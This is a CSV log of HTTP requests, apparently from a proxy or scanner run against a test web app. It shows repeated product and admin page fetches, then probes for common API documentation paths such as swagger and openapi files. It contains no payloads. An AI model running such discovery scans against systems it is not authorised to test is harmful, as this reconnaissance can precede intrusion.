ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6574,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/5?_rsc=tXyZJ52UQVBCVsD3,200,OK,525,429,1100
6576,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,514,429,1102
6578,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6579,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6582,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,514,429,1100
6584,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,552,429,1100
6586,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,511,429,1102
6588,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,510,428,983
6590,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,510,428,983
6592,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:14 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,530,429,1100
6594,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,561,429,1100
6596,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,429,1102
6598,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,517,429,1100
6600,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,564,429,1100
6602,Mon Sep 07 03:14:14 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,501,429,1100
6604,Mon Sep 07 03:14:13 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,1879,535,102606
6606,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6608,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/544?_rsc=tXyZJ52UQVBCVsD3,200,OK,503,429,1102
6610,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,518,429,1100
6612,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6614,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:15 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6616,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/6?_rsc=tXyZJ52UQVBCVsD3,200,OK,509,429,1100
6618,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,539,429,1100
6620,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,514,429,1100
6621,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,528,429,1100
6624,Mon Sep 07 03:14:16 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/7?_rsc=tXyZJ52UQVBCVsD3,200,OK,540,429,1100
6626,Mon Sep 07 03:14:16 BDT 2026,Mon Sep 07 03:14:16 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,505,428,983
6628,Mon Sep 07 03:14:16 BDT 2026,Mon Sep 07 03:14:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/8?_rsc=tXyZJ52UQVBCVsD3,200,OK,531,429,1100
6630,Mon Sep 07 03:14:15 BDT 2026,Mon Sep 07 03:14:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,1859,535,102606
6632,Mon Sep 07 03:14:17 BDT 2026,Mon Sep 07 03:14:17 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,520,429,1100
6634,Mon Sep 07 03:14:17 BDT 2026,Mon Sep 07 03:14:18 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,516,429,1100
6636,Mon Sep 07 03:14:18 BDT 2026,Mon Sep 07 03:14:18 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,549,429,1100
6638,Mon Sep 07 03:14:18 BDT 2026,Mon Sep 07 03:14:19 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/9?_rsc=tXyZJ52UQVBCVsD3,200,OK,533,429,1100
6640,Mon Sep 07 03:14:19 BDT 2026,Mon Sep 07 03:14:20 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,886,534,75089
6641,Mon Sep 07 03:14:21 BDT 2026,Mon Sep 07 03:14:22 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,548,361,9
6642,Mon Sep 07 03:14:22 BDT 2026,Mon Sep 07 03:14:22 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,510,361,9
6643,Mon Sep 07 03:14:22 BDT 2026,Mon Sep 07 03:14:23 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,538,361,9
6644,Mon Sep 07 03:14:25 BDT 2026,Mon Sep 07 03:14:25 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,535,435,271
6645,Mon Sep 07 03:14:26 BDT 2026,Mon Sep 07 03:14:27 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,1061,534,75089
6646,Mon Sep 07 03:14:27 BDT 2026,Mon Sep 07 03:14:28 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,501,361,9
6647,Mon Sep 07 03:14:28 BDT 2026,Mon Sep 07 03:14:28 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,522,361,9
6648,Mon Sep 07 03:14:28 BDT 2026,Mon Sep 07 03:14:29 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,540,361,9
6649,Mon Sep 07 03:14:29 BDT 2026,Mon Sep 07 03:14:29 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,538,435,271
6650,Mon Sep 07 03:14:29 BDT 2026,Mon Sep 07 03:14:30 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,893,534,75089
6651,Mon Sep 07 03:14:30 BDT 2026,Mon Sep 07 03:14:31 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,505,361,9
6652,Mon Sep 07 03:14:31 BDT 2026,Mon Sep 07 03:14:31 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,522,361,9
6653,Mon Sep 07 03:14:31 BDT 2026,Mon Sep 07 03:14:32 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,538,361,9
6654,Mon Sep 07 03:14:32 BDT 2026,Mon Sep 07 03:14:33 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,575,435,271
6655,Mon Sep 07 03:14:33 BDT 2026,Mon Sep 07 03:14:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger-ui/,308,Permanent Redirect,541,286,11
6656,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/v3/api-docs,404,Not Found,582,436,1090
6657,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,200,OK,646,460,9321
6658,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,972,534,75089
6659,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger.json,404,Not Found,546,436,1090
6660,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/openapi.json,404,Not Found,522,436,1090
6661,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,553,361,9
6662,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/api-docs,404,Not Found,538,436,1090
6663,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2164,535,102606
6664,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2248,535,102606
6665,Mon Sep 07 03:14:35 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,557,361,9
6666,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2176,535,102606
6667,Mon Sep 07 03:14:34 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2481,535,102606
6668,Mon Sep 07 03:14:33 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,3102,535,102606
6669,Mon Sep 07 03:14:36 BDT 2026,Mon Sep 07 03:14:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/docs/,308,Permanent Redirect,520,273,5
6670,Mon Sep 07 03:14:36 BDT 2026,Mon Sep 07 03:14:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,524,361,9
6671,Mon Sep 07 03:14:36 BDT 2026,Mon Sep 07 03:14:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger,404,Not Found,646,436,1090
6672,Mon Sep 07 03:14:37 BDT 2026,Mon Sep 07 03:14:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/v2/api-docs,404,Not Found,541,436,1090
6673,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger-ui/index.html,404,Not Found,553,436,1090
6674,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/openapi.yaml,404,Not Found,495,436,1090
6675,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,508,435,271
6676,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,307,Temporary Redirect,648,274,0
6677,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger.yaml,404,Not Found,705,436,1090
6678,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,307,Temporary Redirect,1223,274,0
6679,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,307,Temporary Redirect,867,274,0
6680,Mon Sep 07 03:14:39 BDT 2026,Mon Sep 07 03:14:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login,307,Temporary Redirect,899,274,0
6681,Mon Sep 07 03:14:40 BDT 2026,Mon Sep 07 03:14:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/swagger/ui/index.html,404,Not Found,1038,436,1090
6682,Mon Sep 07 03:14:38 BDT 2026,Mon Sep 07 03:14:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin,200,OK,2796,535,102606
